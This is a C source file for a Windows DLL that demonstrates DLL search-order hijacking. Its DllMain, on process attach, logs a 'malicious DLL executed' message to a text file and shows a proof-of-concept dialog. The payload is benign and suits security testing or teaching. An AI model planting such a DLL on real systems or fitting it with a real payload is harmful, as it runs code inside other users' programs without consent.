#include <windows.h>
#include <stdio.h>
#include <time.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD   ul_reason_for_call,
    LPVOID  lpReserved
) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            FILE* pFile;
            errno_t err = fopen_s(&pFile, "hijacked_success.txt", "a");
            if (err == 0 && pFile) {
                time_t now = time(NULL);
                fprintf(pFile, "[%s] DLL hijacking successful - malicious DLL executed via DllMain\n", ctime(&now));
                fclose(pFile);
            }
            
            // Comment this out if running in a headless/automated context
            MessageBoxA(NULL, 
                "DLL Hijacking PoC: Malicious DLL executed!\n\nCheck hijacked_success.txt for proof.", 
                "DLL Search-Order Hijacking Demonstration", 
                MB_OK | MB_ICONINFORMATION);
            
            break;
        }
        
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}